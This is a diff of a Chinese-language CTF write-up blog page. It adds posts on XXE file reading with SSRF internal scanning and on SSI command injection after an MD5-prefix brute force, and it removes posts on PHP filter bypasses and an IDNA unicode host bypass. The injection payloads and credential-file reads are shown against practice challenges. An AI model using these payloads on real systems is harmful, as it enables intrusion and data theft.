@@ -71,6 +71,122 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-page-82" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2021/07/29/page-82/" class="article-date">
+  <time class="dt-published" datetime="2021-07-29T06:23:29.000Z" itemprop="datePublished">2021-07-29</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2021/07/29/page-82/">NCTF2019True XML cookbook</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p>这边是xxe漏洞**<br> XXE ：Xml External Entity 外部实体注入攻击**<br>是利用一种xml的语言进行的注入攻击<br>构造假的xml语言进行注入攻击 <strong>之前[NCTF2019]fakeXMLcookbook也利用到xxe漏洞</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">xxe漏洞可以进行一堆的神奇操作</span><br><span class="line">读取系统文件 </span><br><span class="line">获取源代码</span><br><span class="line">进行ssrf</span><br><span class="line">进行Phar触发反序列化 </span><br></pre></td></tr></table></figure>
+
+<p>这题这边可以进行ssrf攻击探测内网主机<br>这边可以用file:// 或者php:// 等伪协议进行获取文件（获取代码最好用php://filter进行base64转码）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">读取一些配置文件 ：</span><br><span class="line">/etc/hosts 储存域名解析的缓存</span><br><span class="line">/etc/passwd 用户密码</span><br><span class="line">/proc/net/arp 每个网络接口的arp表中dev包</span><br><span class="line">/proc/net/arp 获取ip</span><br></pre></td></tr></table></figure>
+
+<p>然后 /etc/hosts发现内网地址</p>
+<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/75.PNG?raw=true" alt="75.PNG"></p>
+<p>但是没有当前ip</p>
+<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/76.PNG?raw=true" alt="76.PNG"></p>
+<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/77.PNG?raw=true" alt="77.PNG"></p>
+<p>然后利用burp的爆破模块进行扫描内网主机然后在10.0.48.6拿到flag</p>
+<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/78.PNG?raw=true" alt="78.PNG"></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2021/07/29/page-82/" data-id="cksyl7wk20021w4w715dfhgwn" data-title="NCTF2019True XML cookbook" class="article-share-link">Share</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-page-81" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2021/07/29/page-81/" class="article-date">
+  <time class="dt-published" datetime="2021-07-29T06:23:27.000Z" itemprop="datePublished">2021-07-29</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2021/07/29/page-81/">BJDCTF2020EasySearch</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p>老样子还是得扫后台扫到一个index.php.swp 进入后给了源码 重点是这部分</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">if(isset($_POST[&#x27;username&#x27;]) and $_POST[&#x27;username&#x27;] != &#x27;&#x27; )</span><br><span class="line">    &#123;</span><br><span class="line">        $admin = &#x27;6d0bc1&#x27;;</span><br><span class="line">        if ( $admin == substr(md5($_POST[&#x27;password&#x27;]),0,6)) &#123;</span><br><span class="line">            echo &quot;&lt;script&gt;alert(&#x27;[+] Welcome to manage system&#x27;)&lt;/script&gt;&quot;;</span><br><span class="line">            $file_shtml = &quot;public/&quot;.get_hash().&quot;.shtml&quot;;</span><br><span class="line">            $shtml = fopen($file_shtml, &quot;w&quot;) or die(&quot;Unable to open file!&quot;);</span><br><span class="line">            $text = &#x27;</span><br><span class="line">            ***</span><br><span class="line">            ***</span><br><span class="line">            &lt;h1&gt;Hello,&#x27;.$_POST[&#x27;username&#x27;].&#x27;&lt;/h1&gt;</span><br><span class="line">            ***</span><br><span class="line">			***&#x27;;</span><br><span class="line">            fwrite($shtml,$text);</span><br><span class="line">            fclose($shtml);</span><br></pre></td></tr></table></figure>
+
+<p><strong>只要有一个密码前六位的MD5是6d0bc1 跑脚本：</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">a= <span class="string">&quot;0123456789&quot;</span></span><br><span class="line"><span class="keyword">for</span> o <span class="keyword">in</span> a:</span><br><span class="line">    <span class="keyword">for</span> p <span class="keyword">in</span> a:</span><br><span class="line">        <span class="keyword">for</span> q <span class="keyword">in</span> a:</span><br><span class="line">            <span class="keyword">for</span> r <span class="keyword">in</span> a:</span><br><span class="line">                <span class="keyword">for</span> s <span class="keyword">in</span> a:</span><br><span class="line">                    <span class="keyword">for</span> t <span class="keyword">in</span> a:</span><br><span class="line">                        <span class="keyword">for</span> u <span class="keyword">in</span> a:</span><br><span class="line">                            b = <span class="built_in">str</span>(o)+<span class="built_in">str</span>(p)+<span class="built_in">str</span>(q)+<span class="built_in">str</span>(r)+<span class="built_in">str</span>(s)+<span class="built_in">str</span>(t)+<span class="built_in">str</span>(u)</span><br><span class="line">                            md5 = hashlib.md5(b.encode(<span class="string">&#x27;utf-8&#x27;</span>)).hexdigest()</span><br><span class="line">                            <span class="keyword">if</span> ((md5[<span class="number">0</span>:<span class="number">6</span>])==<span class="string">&#x27;6d0bc1&#x27;</span>):</span><br><span class="line">                                <span class="built_in">print</span> b</span><br></pre></td></tr></table></figure>
+
+<p><strong>2020666</strong><br><strong>2305004</strong><br><strong>9162671</strong>  这仨结果随便选一个 <strong>username=2020666&amp;password=2020666</strong><br>然后抓包发现这边好像会写入一个.shtml 的文件可以访问</p>
+<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/68.PNG?raw=true" alt="68.PNG"></p>
+<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/69.PNG?raw=true" alt="69.PNG"></p>
+<p>百度了一下这边可以<strong>进行ssi注入</strong> </p>
+<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/70.PNG?raw=true" alt="70.PNG"></p>
+<p>参考链接：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/bonelee/p/12027775.html">https://www.cnblogs.com/bonelee/p/12027775.html</a><br>可以进行远程命令执行  </p>
+<p>传个ls试试 </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=&lt;!--#exec cmd=&quot;ls&quot; --&gt;&amp;password=2020666</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/67.PNG?raw=true" alt="67.PNG"></p>
+<p>可以访问到but该文件 flag不在这     </p>
+<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/72.PNG?raw=true" alt="72.PNG"></p>
+<p>返回上一个目录 </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=&lt;!--#exec cmd=&quot;ls ../&quot; --&gt;&amp;password=2020666  </span><br></pre></td></tr></table></figure>
+
+<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/74.PNG?raw=true" alt="74.PNG"></p>
+<p>看样子可以找到flag<br>传入：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=&lt;!--#exec cmd=&quot;cat ../flag_990c66bf85a09c664f0b6741840499b2&quot; --&gt;&amp;password=2020666</span><br></pre></td></tr></table></figure>
+
+<p> 访问生成的文件 ok</p>
+<p> <img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/73.PNG?raw=true" alt="73.PNG"></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2021/07/29/page-81/" data-id="cksyl7wk1001zw4w731w9gkjc" data-title="BJDCTF2020EasySearch" class="article-share-link">Share</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
     <article id="post-page-80" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
     <a href="/2021/07/29/page-80/" class="article-date">
@@ -533,114 +649,6 @@ POST：_SESSION[flagflag]=";s:3:"aaa";s:3:"img";s:20:"L2QwZzNfZmxsbGxsbGFn";}
 
 
   
-    <article id="post-page-71" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2021/07/13/page-71/" class="article-date">
-  <time class="dt-published" datetime="2021-07-13T08:58:45.000Z" itemprop="datePublished">2021-07-13</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2021/07/13/page-71/">WUSTCTF2020朴实无华</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <p><strong>扫后台扫到robots.txt</strong><br>访问得到源码<br>&lt;?php<br>header(‘Content-type:text/html;charset=utf-8’);<br>error_reporting(0);<br>highlight_file(__ file__);</p>
-<p>//level 1<br>if (isset($_GET[‘num’])){<br>    $num = $_GET[‘num’];<br>    if(intval($num) &lt; 2020 &amp;&amp; intval($num + 1) &gt; 2021){<br>        echo “我不经意间看了看我的劳力士, 不是想看时间, 只是想不经意间, 让你知道我过得比你好.</br>“;<br>    }else{<br>        die(“金钱解决不了穷人的本质问题”);<br>    }<br>}else{<br>    die(“去非洲吧”);<br>}<br>//level 2<br>if (isset($_GET[‘md5’])){<br>   $md5=$_GET[‘md5’];<br>   if ($md5==md5($md5))<br>       echo “想到这个CTFer拿到flag后, 感激涕零, 跑去东澜岸, 找一家餐厅, 把厨师轰出去, 自己炒两个拿手小菜, 倒一杯散装白酒, 致富有道, 别学小暴.</br>“;<br>   else<br>       die(“我赶紧喊来我的酒肉朋友, 他打了个电话, 把他一家安排到了非洲”);<br>}else{<br>    die(“去非洲吧”);<br>}</p>
-<p>//get flag<br>if (isset($_GET[‘get_flag’])){<br>    $get_flag = $_GET[‘get_flag’];<br>    if(!strstr($get_flag,” “)){<br>        $get_flag = str_ireplace(“cat”, “wctf2020”, $get_flag);<br>        echo “想到这里, 我充实而欣慰, 有钱人的快乐往往就是这么的朴实无华, 且枯燥.</br>“;<br>        system($get_flag);<br>    }else{<br>        die(“快到非洲了”);<br>    }<br>}else{<br>    die(“去非洲吧”);<br>}<br>?&gt; </p>
-<p>拿flag要过两关：</p>
-<p>if (isset($_GET[‘num’])){<br>    $num = $_GET[‘num’];<br>    if(intval($num) &lt; 2020 &amp;&amp; intval($num + 1) &gt; 2021){<br><strong>假设num=1e8</strong><br><strong>intval函数 intval($num) 会被截断成1 但是intval（$num+1）会变成100000001 就能绕过这个2020 2021了</strong></p>
-<p>if (isset($_GET[‘md5’])){<br>   $md5=$_GET[‘md5’];<br>   if ($md5==md5($md5))<br><strong>找到一串MD5加密前后一样的 祭出脚本大法</strong><br>import hashlib</p>
-<p>for i in range(0,10**41):<br>    i=’0e’+str(i)<br>    md5=hashlib.md5(i.encode()).hexdigest()<br>    if md5[:2]==’0e’ and md5[2:].isdigit():<br>        print(‘md5:{} ‘.format(i))<br>        break </p>
-<p><strong>得到：md5:0e215962017</strong>  </p>
-<p>?num=1e8&amp;md5=0e215962017 </p>
-<p>if (isset($_GET[‘get_flag’])){<br>    $get_flag = $_GET[‘get_flag’];<br>    if(!strstr($get_flag,” “)){<br>        $get_flag = str_ireplace(“cat”, “wctf2020”, $get_flag);<br><strong>这边过滤了空格和cat会被替换成wctf2020</strong><br><strong>先看一下flag在哪num=1e7&amp;md5=0e215962017&amp;get_flag=ls</strong></p>
-<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/18.PNG?raw=true" alt="18.PNG"></p>
-<p>用%09绕过空格 然后cat用反斜杠绕过 ca\t<br>最终payload ：?num=1e7&amp;md5=0e215962017&amp;get_flag=ca\t%09那一大长串</p>
-<p>​        </p>
-<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/19.PNG?raw=true" alt="19.PNG"></p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2021/07/13/page-71/" data-id="cksyl7wjx001pw4w777nfh8du" data-title="WUSTCTF2020朴实无华" class="article-share-link">Share</a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
-    <article id="post-page-69" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2021/07/13/page-69/" class="article-date">
-  <time class="dt-published" datetime="2021-07-13T08:58:41.000Z" itemprop="datePublished">2021-07-13</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2021/07/13/page-69/">SUCTF 2019 Pythonginx</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <p><strong>这关主要是url中的unicode漏洞引发的域名安全问题</strong><br>1、域名欺骗 ：<br>访问此网站http://Вaidu.com(其中的В是unicode U+0412)<br>会跳转到<a target="_blank" rel="noopener" href="http://вaidu.com/">http://xn--aidu-f4d.com/</a><br>也可以换成其他的unicode<br>访问http://Вaidu.com 时浏览器会将访问的url交给域名系统（DNS）解析url为ip地址<br>解析url过程用到递归查询和迭代查询 先递归搜索浏览器自己的dns缓存然后搜索操作系统的dns缓存 再搜索hosts文件缓存<br>搜索本地域名服务器 但后迭代搜索根域名服务器知道找到ip地址 找不到就是404<br>在DNS中idna使用punycode转写将ascii字符串存储，本地DNS中因为遇见特殊字符В 因此无法将其转成正常ascii<br>就直接在本地转化为<a target="_blank" rel="noopener" href="http://вaidu.com/">http://xn--aidu-f4d.com/</a></p>
-<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/22.PNG?raw=true" alt="22.PNG"></p>
-<p><strong>还有要知道ngix重要文件的位置</strong><br><strong>nginx重要文件的位置：</strong></p>
-<p>配置文件存放目录：/etc/nginx<br>主配置文件：/etc/nginx/conf/nginx.conf<br>管理脚本：/usr/lib64/systemd/system/nginx.service<br>模块：/usr/lisb64/nginx/modules<br>应用程序：/usr/sbin/nginx<br>程序默认存放位置：/usr/share/nginx/html<br>日志默认存放位置：/var/log/nginx<br>配置文件目录为：/usr/local/nginx/conf/nginx.conf</p>
-<p>源码这边<br> @app.route(‘/getUrl’, methods=[‘GET’, ‘POST’])<br>def getUrl():<br>    url = request.args.get(“url”)<br>    host = parse.urlparse(url).hostname<br>    if host == ‘suctf.cc’:<br>        return “我扌 your problem? 111”<br>    parts = list(urlsplit(url))<br>    host = parts[1]<br>    if host == ‘suctf.cc’:<br>        return “我扌 your problem? 222 “ + host<br>    newhost = []<br>    for h in host.split(‘.’):<br>        newhost.append(h.encode(‘idna’).decode(‘utf-8’))<br>    parts[1] = ‘.’.join(newhost)<br>    #去掉 url 中的空格<br>    finalUrl = urlunsplit(parts).split(‘ ‘)[0]<br>    host = parse.urlparse(finalUrl).hostname<br>    if host == ‘suctf.cc’:<br>        return urllib.request.urlopen(finalUrl).read()<br>    else:<br>        return “我扌 your problem? 333”<br>    </code><br>    <!-- Dont worry about the suctf.cc. Go on! --><br>    <!-- Do you know the nginx? --></p>
-</body>
-是要对host的判断然后绕过这两个判断
-如果一开始就是suctf.cc压根就没办法 
-
-<p><strong>需要访问suctf.cc/user/local/nginx/conf/nginx.conf</strong>  访问这个配置文件应该能找到flag 位置<br>跑脚本 </p>
-<p>#coding:utf-8</p>
-<p>for i in range(128,65537):<br>    tmp=chr(i)<br>    try:<br>        res = tmp.encode(‘idna’).decode(‘utf-8’)<br>        if(“-“) in res:<br>            continue<br>        print(“U:{}    A:{}      ascii:{} “.format(tmp, res, i))<br>    except:<br>        pass</p>
-<p><strong>找到℆这么一个字符恰好会因为这个漏洞被解析成c/u 这样就能绕过</strong></p>
-<p>构造file://suctf.c℆sr/local/nginx/conf/nginx.conf  也可以用ℂ 来替代c</p>
-<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/23.PNG?raw=true" alt="23.PNG"></p>
-<p>最终payload：</p>
-<p>file://suctf.c℆sr/fffffflag</p>
-<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/24.PNG?raw=true" alt="24.PNG"></p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2021/07/13/page-69/" data-id="cksyl7wjw001ow4w74htm6grs" data-title="SUCTF 2019 Pythonginx" class="article-share-link">Share</a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
 
 
   <nav id="page-nav">
@@ -664,7 +672,7 @@ POST：_SESSION[flagflag]=";s:3:"aaa";s:3:"img";s:20:"L2QwZzNfZmxsbGxsbGFn";}
   <div class="widget-wrap">
     <h3 class="widget-title">Archives</h3>
     <div class="widget">
-      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/08/">August 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/07/">July 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/06/">June 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/05/">May 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/04/">April 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/03/">March 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/02/">February 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/01/">January 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/11/">November 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/10/">October 2020</a></li></ul>
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/09/">September 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/08/">August 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/07/">July 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/06/">June 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/05/">May 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/04/">April 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/03/">March 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/02/">February 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/01/">January 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/11/">November 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/10/">October 2020</a></li></ul>
     </div>
   </div>
 
@@ -677,6 +685,14 @@ POST：_SESSION[flagflag]=";s:3:"aaa";s:3:"img";s:20:"L2QwZzNfZmxsbGxsbGFn";}
       <ul>
         
           <li>
+            <a href="/2021/09/09/page-115/">又是misc</a>
+          </li>
+        
+          <li>
+            <a href="/2021/09/09/page-114/">page</a>
+          </li>
+        
+          <li>
             <a href="/2021/08/13/page-110/">一大堆的misc 很大一堆</a>
           </li>
         
@@ -686,14 +702,6 @@ POST：_SESSION[flagflag]=";s:3:"aaa";s:3:"img";s:20:"L2QwZzNfZmxsbGxsbGFn";}
         
           <li>
             <a href="/2021/08/13/page-108/">b01lers2020Welcome to Earth</a>
-          </li>
-        
-          <li>
-            <a href="/2021/08/13/page-107/">SUCTF 2019EasyWeb</a>
-          </li>
-        
-          <li>
-            <a href="/2021/08/13/page-106/">WUSTCTF2020CV Maker</a>
           </li>
         
       </ul>
